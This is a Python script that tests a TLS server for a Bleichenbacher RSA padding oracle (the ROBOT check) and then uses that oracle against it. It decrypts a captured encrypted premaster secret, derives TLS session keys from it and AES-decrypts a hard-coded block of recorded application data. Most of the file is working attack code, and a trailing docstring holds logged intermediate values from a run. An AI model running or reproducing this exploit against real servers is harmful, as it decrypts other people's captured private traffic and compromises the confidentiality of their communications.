#!/usr/bin/env python3

# standard modules
import math
import time
import sys
import socket
import os
import argparse
import ssl
import gmpy2
from cryptography import x509
from cryptography.hazmat.backends import default_backend

# This uses all TLS_RSA ciphers with AES and 3DES
ch_def = bytearray.fromhex("16030100610100005d03034f20d66cba6399e552fd735d75feb0eeae2ea2ebb357c9004e21d0c2574f837a000010009d003d0035009c003c002f000a00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

# This uses only TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)
ch_cbc = bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004002f00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

# This uses only TLS-RSA-WITH-AES-128-GCM-SHA256 (0x009c)
ch_gcm = bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004009c00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

ccs = bytearray.fromhex("000101")
enc = bytearray.fromhex("005091a3b6aaa2b64d126e5583b04c113259c4efa48e40a19b8e5f2542c3b1d30f8d80b7582b72f08b21dfcbff09d4b281676a0fb40d48c20c4f388617ff5c00808a96fbfe9bb6cc631101a6ba6b6bc696f0")

MSG_FASTOPEN = 0x20000000
# set to true if you want to generate a signature or if the first ciphertext is not PKCS#1 v1.5 conform
EXECUTE_BLINDING = True


from Crypto.Util.Padding import unpad

# from cipher_suites import prf

# import tls
# import encryption_algorithms
import hmac
import hashlib
import base64
from Crypto.Cipher import AES
from Crypto import Random

def derive_key(client_random, server_random, premaster_secret):

  h = bytes.fromhex(premaster_secret[-48:]) 
  seed0 = client_random + server_random
  # prf = prf(tls_version, algorithm, h, b'master secret', seed, 48)

  label = b"HmacSHA256"
  seed1 = label + seed0
  A0 = seed1
  A1 = hmac.new(h, A0, digestmod=hashlib.sha256).digest()
  A2 = hmac.new(h, A1, digestmod=hashlib.sha256).digest()
  P_hash = hmac.new(h, A1+seed1, digestmod=hashlib.sha256).digest() + hmac.new(h, A2+seed1, digestmod=hashlib.sha256).digest()
  # signature = base64.b64encode(prf).decode()
  # print(len(signature))
  # print(prf)
  # print(len(prf))
  print(P_hash)
  print(len(P_hash))
  data = '0960ba5ab6337ed3afaaf1424e482f90e3e6507741626c919a25b8f147aa8fb5a24fda6979fa5c9b32953bdf77c1b1fca70dbcc01b299e4444139288c4b97a28c65f9eb22951f5ad1b1b138409a8fecd66edfbefcc031a4d63eabc324d2fe59b9fdddcd7305254dae08d61c129434d8ee36f9e5bcb4b6a4bc84bdc4aba926ec049780fa42a75eb163d3204abc1bac10f38fad9865ecb66f402eb7519eb99241f0ec067206c3eb73470b8e8c5f5393a5632ea24b6179bc53f9ddd8fccde5eab2690c78a8deb51d00075b46ab8f62e55b593d30becf87b5c42b51e099267df8bf16fb8bda21b9ad69b02fc9e174b68e8ac3b01860f9db812c99c3ece53db7a2d3c5f2dc9e14915c0385fca1b193402aff88791e034e062c08f062d7d13d3c6184b78d77b9642396ffad9e50ffeb23bb685b4373aa43f0531e2cb776916ac199be7f7d7dc4d4906b7a504433837858e1b6d60aac219ae7f9571bb68808d973c853b84997326178b472cc4ce4d544326a1e2'
  master_secret = P_hash[:48]
  master_seed = b"key expansion" + seed0
  master_0 = master_seed
  master_1 = hmac.new(master_secret, master_0, digestmod=hashlib.sha256).digest()
  master_2 = hmac.new(master_secret, master_1, digestmod=hashlib.sha256).digest()
  master_3 = hmac.new(master_secret, master_2, digestmod=hashlib.sha256).digest()
  master_4 = hmac.new(master_secret, master_3, digestmod=hashlib.sha256).digest()
  P_hash2 = hmac.new(master_secret, master_1+master_seed, digestmod=hashlib.sha256).digest() + hmac.new(master_secret, master_2+master_seed, digestmod=hashlib.sha256).digest()+hmac.new(master_secret, master_3+master_seed, digestmod=hashlib.sha256).digest()#+hmac.new(master_secret, master_4+master_seed, digestmod=hashlib.sha256).digest()
  print(len(P_hash2))
  app_data = bytes.fromhex(data)
  client_write_key = P_hash2[32:48]
  client_iv = P_hash2[64:80]
  # iv = client_write_key[16:]
  # enc_key = client_write_key[:16]
  # iv = app_data[:16]
  print(len(client_iv),len(client_write_key))
  cipher = AES.new(client_write_key, AES.MODE_CBC, client_iv)
  # d = unpad(cipher.decrypt(app_data),16)
  d = cipher.decrypt(app_data)
  print(d.hex())
  # print(d.decode('hex'))
  # dd = d.hex()
  # print(dd)
  # with open('f.txt', 'w') as f:
  #     f.write(dd)
  # print(d)


def get_rsa_from_server(server, port, timeout, quiet):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers("RSA")
        raw_socket = socket.socket()
        raw_socket.settimeout(timeout)
        s = ctx.wrap_socket(raw_socket)
        s.connect((server, port))
        cert_raw = s.getpeercert(binary_form=True)
        cert_dec = x509.load_der_x509_certificate(cert_raw, default_backend())
        return cert_dec.public_key().public_numbers().n, cert_dec.public_key().public_numbers().e
    except ssl.SSLError as e:
        if not quiet:
            print("Cannot connect to server: %s" % e)
            print("Server does not seem to allow connections with TLS_RSA (this is ideal).")
        quit()
    except (ConnectionRefusedError, socket.timeout) as e:
        if not quiet:
            print("Cannot connect to server: %s" % e)
            print("There seems to be no TLS on this host/port.")
        quit()

ct = 0

def oracle(pms, messageflow=False):
    global cke_version, ct, enable_fastopen, ch, ip, port
    ct += 1
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if not enable_fastopen:
            s.connect((ip, port))
            s.sendall(ch)
        else:
            s.sendto(ch, MSG_FASTOPEN, (ip, port))
        s.settimeout(timeout)
        buf = bytearray.fromhex("")
        i = 0
        bend = 0
        while True:
            # we try to read twice
            while i + 5 > bend:
                buf += s.recv(4096)
                bend = len(buf)
            # this is the record size
            psize = buf[i + 3] * 256 + buf[i + 4]
            # if the size is 2, we received an alert
            if (psize == 2):
                return ("The server sends an Alert after ClientHello")
            # try to read further record data
            while i + psize + 5 > bend:
                buf += s.recv(4096)
                bend = len(buf)
            # check whether we have already received a ClientHelloDone
            if (buf[i + 5] == 0x0e) or (buf[bend - 4] == 0x0e):
                break
            i += psize + 5
        cke_version = buf[9:11]
        s.send(bytearray(b'\x16') + cke_version)
        s.send(cke_2nd_prefix)
        s.send(pms)
        if not messageflow:
            s.send(bytearray(b'\x14') + cke_version + ccs)
            s.send(bytearray(b'\x16') + cke_version + enc)
        try:
            alert = s.recv(4096)
            if len(alert) == 0:
                return ("No data received from server")
            if alert[0] == 0x15:
                if len(alert) < 7:
                    return ("TLS alert was truncated (%s)" % (repr(alert)))
                return ("TLS alert %i of length %i" % (alert[6], len(alert)))
            else:
                return "Received something other than an alert (%s)" % (alert[0:10])
        except ConnectionResetError as e:
            return "ConnectionResetError"
        except socket.timeout:
            return ("Timeout waiting for alert")
        s.close()
    except Exception as e:
        # exc_type, exc_obj, exc_tb = sys.exc_info()
        # print("line %i", exc_tb.tb_lineno)
        # print ("Exception received: " + str(e))
        return str(e)


def perform_attack(server_port, host, quiet, client_random, server_random, enc_premaster_secret):
  global port, timeout
  port = server_port
  timeout = 5

  # if args.gcm:
  #     ch = ch_gcm
  # elif args.cbc:
  #     ch = ch_cbc
  # else:
  global ch
  ch = ch_def

  # We only enable TCP fast open if the Linux proc interface exists
  global enable_fastopen
  enable_fastopen = os.path.exists("/proc/sys/net/ipv4/tcp_fastopen")

  try:
    global ip
    ip = socket.gethostbyname(host)
  except socket.gaierror as e:
      print("Cannot resolve host: %s" % e)

      quit()

  N, e = get_rsa_from_server(ip, port, timeout, quiet)
  modulus_bits = int(math.ceil(math.log(N, 2)))
  modulus_bytes = (modulus_bits + 7) // 8
  if not quiet:
      print("RSA N: %s" % hex(N))
      print("RSA e: %s" % hex(e))
      print ("Modulus size: %i bits, %i bytes" % (modulus_bits, modulus_bytes))

  global cke_2nd_prefix
  cke_2nd_prefix = bytearray.fromhex("{0:0{1}x}".format(modulus_bytes + 6, 4) + "10" + "{0:0{1}x}".format(modulus_bytes + 2, 6) + "{0:0{1}x}".format(modulus_bytes, 4))
  # pad_len is length in hex chars, so bytelen * 2
  pad_len = (modulus_bytes - 48 - 3) * 2
  rnd_pad = ("abcd" * (pad_len // 2 + 1))[:pad_len]

  rnd_pms = "aa112233445566778899112233445566778899112233445566778899112233445566778899112233445566778899"
  pms_good_in = int("0002" + rnd_pad + "00" + "0303" + rnd_pms, 16)
  # wrong first two bytes
  pms_bad_in1 = int("4117" + rnd_pad + "00" + "0303" + rnd_pms, 16)
  # 0x00 on a wrong position, also trigger older JSSE bug
  pms_bad_in2 = int("0002" + rnd_pad + "11" + rnd_pms + "0011", 16)
  # no 0x00 in the middle
  pms_bad_in3 = int("0002" + rnd_pad + "11" + "1111" + rnd_pms, 16)
  # wrong version number (according to Klima / Pokorny / Rosa paper)
  pms_bad_in4 = int("0002" + rnd_pad + "00" + "0202" + rnd_pms, 16)

  pms_good = int(gmpy2.powmod(pms_good_in, e, N)).to_bytes(modulus_bytes, byteorder="big")
  pms_bad1 = int(gmpy2.powmod(pms_bad_in1, e, N)).to_bytes(modulus_bytes, byteorder="big")
  pms_bad2 = int(gmpy2.powmod(pms_bad_in2, e, N)).to_bytes(modulus_bytes, byteorder="big")
  pms_bad3 = int(gmpy2.powmod(pms_bad_in3, e, N)).to_bytes(modulus_bytes, byteorder="big")
  pms_bad4 = int(gmpy2.powmod(pms_bad_in4, e, N)).to_bytes(modulus_bytes, byteorder="big")


  oracle_good = oracle(pms_good, messageflow=False)
  oracle_bad1 = oracle(pms_bad1, messageflow=False)
  oracle_bad2 = oracle(pms_bad2, messageflow=False)
  oracle_bad3 = oracle(pms_bad3, messageflow=False)
  oracle_bad4 = oracle(pms_bad4, messageflow=False)

  if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
      if not quiet:
          print("Identical results (%s), retrying with changed messageflow" % oracle_good)
      oracle_good = oracle(pms_good, messageflow=True)
      oracle_bad1 = oracle(pms_bad1, messageflow=True)
      oracle_bad2 = oracle(pms_bad2, messageflow=True)
      oracle_bad3 = oracle(pms_bad3, messageflow=True)
      oracle_bad4 = oracle(pms_bad4, messageflow=True)
      if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
          if not quiet:
              print("Identical results (%s), no working oracle found" % oracle_good)
              print("NOT VULNERABLE!")
          sys.exit(1)
      else:
          flow = True
  else:
      flow = False

  # Re-checking all oracles to avoid unreliable results
  oracle_good_verify = oracle(pms_good, messageflow=flow)
  oracle_bad_verify1 = oracle(pms_bad1, messageflow=flow)
  oracle_bad_verify2 = oracle(pms_bad2, messageflow=flow)
  oracle_bad_verify3 = oracle(pms_bad3, messageflow=flow)
  oracle_bad_verify4 = oracle(pms_bad4, messageflow=flow)

  if (oracle_good != oracle_good_verify) or (oracle_bad1 != oracle_bad_verify1) or (oracle_bad2 != oracle_bad_verify2) or (oracle_bad3 != oracle_bad_verify3) or (oracle_bad4 != oracle_bad_verify4):
      if not quiet:
          print("Getting inconsistent results, aborting.")
      quit()

  # If the response to the invalid PKCS#1 request (oracle_bad1) is equal to both
  # requests starting with 0002, we have a weak oracle. This is because the only
  # case where we can distinguish valid from invalid requests is when we send
  # correctly formatted PKCS#1 message with 0x00 on a correct position. This
  # makes our oracle weak
  if (oracle_bad1 == oracle_bad2 == oracle_bad3):
      oracle_strength = "weak"
      if not quiet:
          print ("The oracle is weak, the attack would take too long")
  else:
      oracle_strength = "strong"
      if not quiet:
          print("The oracle is strong, real attack is possible")

  if flow:
      flowt = "shortened"
  else:
      flowt = "standard"

  if cke_version[0] == 3 and cke_version[1] == 0:
      tlsver = "SSLv3"
  elif cke_version[0] == 3 and cke_version[1] == 1:
      tlsver = "TLSv1.0"
  elif cke_version[0] == 3 and cke_version[1] == 2:
      tlsver = "TLSv1.1"
  elif cke_version[0] == 3 and cke_version[1] == 3:
      tlsver = "TLSv1.2"
  else:
      tlsver = "TLS raw version %i/%i" % (cke_version[0], cke_version[1])

  print("VULNERABLE! Oracle (%s) found on %s/%s, %s, %s message flow: %s/%s (%s / %s / %s)" % (oracle_strength, host, ip, tlsver, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))

  if not quiet:
      print("Result of good request:                        %s" % oracle_good)
      print("Result of bad request 1 (wrong first bytes):   %s" % oracle_bad1)
      print("Result of bad request 2 (wrong 0x00 position): %s" % oracle_bad2)
      print("Result of bad request 3 (missing 0x00):        %s" % oracle_bad3)
      print("Result of bad request 4 (bad TLS version):     %s" % oracle_bad4)

  print("Now Let's do the real!")

  # msg = "This message was signed with a Bleichenbacher oracle."
  # our_c = int("0001" + "ff" * (modulus_bytes - len(msg) - 3) + "00" + "".join("{:02x}".format(ord(c)) for c in msg), 16)
  our_c = int.from_bytes(enc_premaster_secret, "big")                         # 1
  # C = int("0001" + "ff" * (modulus_bytes - len(msg) - 3) + "00" + "".join("{:02x}".format(ord(c)) for c in msg), 16)
  # our_c = 0xB744DACEB9F82E810BF3DE28F1A0CEF757395A748A288E36DF1C8F4CE937FAAF34966B6D95D08165FD5B431B832C67AE98C963E4F377A94D60CEEB8D0CC4E6DD430F8E7392CA64173C2AEA953E4BD1FEE6AF681B3E7E424672C2BF955AD95A70BA28629205836D43FAF2571EEAA63416D1FC3F543664600F25678C0252C43F6C9E00D875737E2F9B1263A09B41D13DBCB5373F73FC03B1D5A33AF6769FEC1FAD20212B41BD9B364244DB9CEF6F8D6E883C0FF1ECDB749463715C37C36C18D8090ED1675815D22416C26661B67EBAF44AEE11D3FA600834A4B8A71941AA70CC448F0B05B332EDC506E1CB87FAAC44DC61929E0AF9EDEA4B5FF5206853150BBE40
  # our_n = 0x00c41ca6b1a4c1ee60e0491aa6a8875054298e70fa3f2f3694678f95c66a903167e6ac5f6462bc2c8e02374cf1e5a5b2a49178dc4409c044898f572cb1fdfa49ddc0324a4c05ffbdc3e3ae1adcd6125cfb0d8b37f423919165c96883177dcf652d2012e4aa7762df5ff6f06066594f6f441ec22b00652ca58102b6b8a8d482826aee8bcac1b1d2a6ac7d5732feff6a064c2c4c8f6e772717d9ea82a56032f6305a6122d0e1bac3caad47ec11eadf00009a2b3bcc7b5fb3cb13530f10bad7de89168efcfa79b569d3ba1e0ed028a1f56bd745e0236c7dbc13c1cc7572f445009eecb2370fa08549bc8d4229cd53570f3de6c6dae83c4e59f4ba1adda9c6d9fd0d3f
  our_n = N
  our_e = 65537
  k = 256

  if N != our_n or our_e != e:
    print (N)
    print (our_n)
    print (e)
    print (our_e)
    print ("!?")
    exit(1)

  print ("N==our_n",N==our_n,"e=our_e",e==our_e)
  print ("Check OK.")

  B = pow(2, 8 * (k - 2))
  B2 = 2 * B
  B3 = B2 + B

  # pms_good = int(gmpy2.powmod(pms_good_in, e, N)).to_bytes(modulus_bytes, byteorder="big")

# find s_0
#s_0 = 1
#s_0 = 12000

# s_0 = 18646 # recorded value (Actually we didn't need this one)
  s_0 = 1
  """
  searching s_0... 18648
  TLS alert 10 of length 7 TLS alert 10 of length 7
  s_0 found. 18648
  double check.
  OK
  """

  def extended_gcd(aa, bb):
      """
      http://rosettacode.org/wiki/Modular_inverse#Python
      """
      lastremainder, remainder = abs(aa), abs(bb)
      x, lastx, y, lasty = 0, 1, 1, 0
      while remainder:
          lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
          x, lastx = lastx - quotient * x, x
          y, lasty = lasty - quotient * y, y
      return lastremainder, lastx * (-1 if aa < 0 else 1), lasty * (-1 if bb < 0 else 1)


  def modinv(a, m):
      """
      http://rosettacode.org/wiki/Modular_inverse#Python
      """
      g, x, y = extended_gcd(a, m)
      if g != 1:
          raise ValueError
      return x % m


  def interval(a, b):
      return range(a, b + 1)

  def ceildiv(a, b):
      """
      http://stackoverflow.com/a/17511341
      """
      return -(-a // b)

  def floordiv(a, b):
      """
      http://stackoverflow.com/a/17511341
      """
      return a // b

  while True:
    s_0 += 1
    print ("searching s_0...",s_0)
    c_d = (our_c * pow(s_0,e,N)) % N
    c = int(c_d).to_bytes(modulus_bytes, byteorder="big")
    q = oracle(c, messageflow=flow)
    print (q,oracle_good)
    if q == oracle_good:
      print ("s_0 found.",s_0)
      print ("double check.")
      if q == oracle(c, messageflow=flow):
        print ("OK")
        break
      else:
        print ("no...")

  set_m_old = {(B2, B3 - 1)}
  i = 1
  # s_old = 37294 # recorded value
  n = N

  print("Starting attack..")
  while True:
          # print("Starting with Step 2")

          if i == 1:
              # print("Starting with Step 2.a")

              s_new = ceildiv(n, B3)  # Explanation follows...
              # ceildiv(n, B3) > s_0. So s_new = s_0+1
              # s_new = s_old + 1
              while True:
                c_d = (our_c * pow(s_new,e,N)) % N
                c = int(c_d).to_bytes(modulus_bytes, byteorder="big")
                q = oracle(c, messageflow=flow)
                # print (s_new,q,oracle_good)
                if q == oracle_good:
                  # print ("s_new found",s_new)
                  break
                s_new += 1

              # print("Found s_new = {} in Step 2.a".format(s_new))

          elif i > 1 and len(set_m_old) >= 2:
              """
              Step 2.b: Searching with more than one interval left.
              If i > 1 and the number of intervals in M_{i−1} is at least 2, then search for the
              smallest integer s_i > s_{i−1}, such that the ciphertext c_0*(s_i)^e mod n is PKCS conforming.
              """

              # print("Starting with Step 2.b")

              s_new = s_old + 1
              while True:
                c_d = (our_c * pow(s_new,e,N)) % N
                c = int(c_d).to_bytes(modulus_bytes, byteorder="big")
                q = oracle(c, messageflow=flow)
                print (s_new,q,oracle_good)
                if q == oracle_good:
                  # print ("s_new found",s_new)
                  break
                s_new += 1

              # print("Found s_new = {} in Step 2.b".format(s_new))

          elif len(set_m_old) == 1:
              """
              Step 2.c: Searching with one interval left.
              If M_{i−1} contains exactly one interval (i.e., M_{i−1} = {[a, b]}),
              then choose small integer values r_i, s_i such that

                  r_i \geq 2 * (bs_{i-1} - 2B) / n

              and

                  (2B + r_i*n) / b \leq s_i < (3B + r_i*n) / a,

              until the ciphertext c_0*(s_i)^e mod n is PKCS conforming.
              """

              # print("Starting with Step 2.c")

              a, b = next(iter(set_m_old))
              found = False
              r = 2 * ceildiv((b * s_old - B2), n)
              while not found:
                  for s in interval(ceildiv(B2 + r*n, b), floordiv(B3 - 1 + r*n, a)):
                    c_d = (our_c * pow(s,e,N)) % N
                    c = int(c_d).to_bytes(modulus_bytes, byteorder="big")
                    q = oracle(c, messageflow=flow)
                    # print (s,q,oracle_good)
                    if q == oracle_good:
                      # print ("s found",s)
                      found = True
                      s_new = s
                      break
                  r += 1

              # print("Found s_new = {} in Step 2.c".format(s_new))

          """
          Step 3: Narrowing the set of solutions.
          After s_i has been found, the set M_i is computed as

              M_i = \bigcup_{(a, b, r)} { [max(a, [2B+rn / s_i]), min(b, [3B-1+rn / s_i])] }

          for all [a, b] \in M_{i-1} and (as_i - 3B + 1)/(n) \leq r \leq (bs_i - 2B)/(n).
          """

          # print("Starting with Step 3")

          set_m_new = set()
          for a, b in set_m_old:
              # r_min = ceildiv(a * s_new - B3 + 1, n)
              # r_max = floordiv(b * s_new - B2, n)

              r_max = (b * s_new - 2 * B) // n
              r_min = (a * s_new - 3 * B + 1) // n
              # print("Found new values for r and a = {}, b = {} -- {} <= r <= {}".format(a, b, r_min, r_max))

              for r in interval(r_min, r_max+1):
                  new_lb = max(a, ceildiv(B2 + r*n, s_new))
                  new_ub = min(b, floordiv(B3 - 1 + r*n, s_new))
                  if new_lb <= new_ub:  # intersection must be non-empty
                      set_m_new |= {(new_lb, new_ub)}

          # for v in set_m_new:
          #     print(str(v))
          #     print(";")

          # print("")

          """
          Step 4: Computing the solution.
          If M_i contains only one interval of length 1 (i.e., M_i = {[a, a]}),
          then set m = a(s_0)^{−1} mod n, and return m as solution of m \equiv c^d (mod n).
          Otherwise, set i = i + 1 and go to step 2.
          """

          # print("Starting with Step 4")

          if len(set_m_new) == 1:
              a, b = next(iter(set_m_new))
              if a == b:
                  #print("Original:   ", hex(m))
                  print("Calculated: ", hex(a))
                  print("Integer = ", a)
                  print("Success after {} calls to the oracle.".format(ct))

                  print(derive_key(client_random, server_random, hex(a)))
                  exit(0)

          i += 1
          #print("Intervals retry", set_m_new)
          # print("Going back to step 2")
          s_old = s_new
          set_m_old = set_m_new



          # print("No luck for set_m_new = {} in Step 4".format(set_m_new))


  """
  Found s_new = 628763230018232076192316524174627403033093932709318854405711796895336685445125914046965737795563557312174633415856645636915629234826504483069256500295289534866700827936273726427547843863857538764857166504567413981554453568090052145034012313708244067598472467010548393279295548635429983814068929132802368615967615344255852033257290519833659429593430858992086666802542855795253565396044379746432604792376293675231778904616909306131857882447205839943179370435741823899347112380441008421294819158984428968909843605940303199544682631467185927746673430938773748786749193082349807002596601869695214989690509237900604582 in Step 2.c
  Starting with Step 3
  Found new values for r and a = 1327651739482852322594470667292127850801255407280512072013252377866561549383090113332496752136736340695223332776290413808530564198334693975350435637674805028501646719367546911858611474880031013563799651289388812930492369262338052601193040092491178852180681560138807650100525564381394237370341528057472667127195164866528306598235002364145145802108781399162571004716926177767943787455060535179992931570788062283992046979830800731379034960575358446958900852542507315173839457320085096088428659795575578379033514382024316711176895868888688648761319136907790916481026002233115544991561680148723179613723220081566457548, b = 1327651739482852322594470667292127850801255407280512072013252377866561549383090113332496752136736340695223332776290413808530564198334693975350435637674805028501646719367546911858611474880031013563799651289388812930492369262338052601193040092491178852180681560138807650100525564381394237370341528057472667127195164866528306598235002364145145802108781399162571004716926177767943787455060535179992931570788062283992046979830800731379034960575358446958900852542507315173839457320085096088428659795575578379033514382024316711176895868888688648761319136907790916481026002233115544991561680148723179613723220081566457549 -- 33719114589252572075750924661695731741112359223584237692697067835210245803573579894086923058329424837644326952109680472528200844064410134517768941424181235770077826853495550059627427843434009658890946037358259925392562798208579147583141847256016322060852795823438707850390595985505541708394835174757839988722865459669396657267440380231328235672498948696605052883311247767341869901217827738902601566122703690727691458503095826994786379120415677348189100025897338019378091631906124448162471739208442812896593789788637566655879493840379915064269816911416023653028391481168707738586851333000913094460195191923691 <= r <= 33719114589252572075750924661695731741112359223584237692697067835210245803573579894086923058329424837644326952109680472528200844064410134517768941424181235770077826853495550059627427843434009658890946037358259925392562798208579147583141847256016322060852795823438707850390595985505541708394835174757839988722865459669396657267440380231328235672498948696605052883311247767341869901217827738902601566122703690727691458503095826994786379120415677348189100025897338019378091631906124448162471739208442812896593789788637566655879493840379915064269816911416023653028391481168707738586851333000913094460195191923691
  (1327651739482852322594470667292127850801255407280512072013252377866561549383090113332496752136736340695223332776290413808530564198334693975350435637674805028501646719367546911858611474880031013563799651289388812930492369262338052601193040092491178852180681560138807650100525564381394237370341528057472667127195164866528306598235002364145145802108781399162571004716926177767943787455060535179992931570788062283992046979830800731379034960575358446958900852542507315173839457320085096088428659795575578379033514382024316711176895868888688648761319136907790916481026002233115544991561680148723179613723220081566457549, 1327651739482852322594470667292127850801255407280512072013252377866561549383090113332496752136736340695223332776290413808530564198334693975350435637674805028501646719367546911858611474880031013563799651289388812930492369262338052601193040092491178852180681560138807650100525564381394237370341528057472667127195164866528306598235002364145145802108781399162571004716926177767943787455060535179992931570788062283992046979830800731379034960575358446958900852542507315173839457320085096088428659795575578379033514382024316711176895868888688648761319136907790916481026002233115544991561680148723179613723220081566457549)

  """
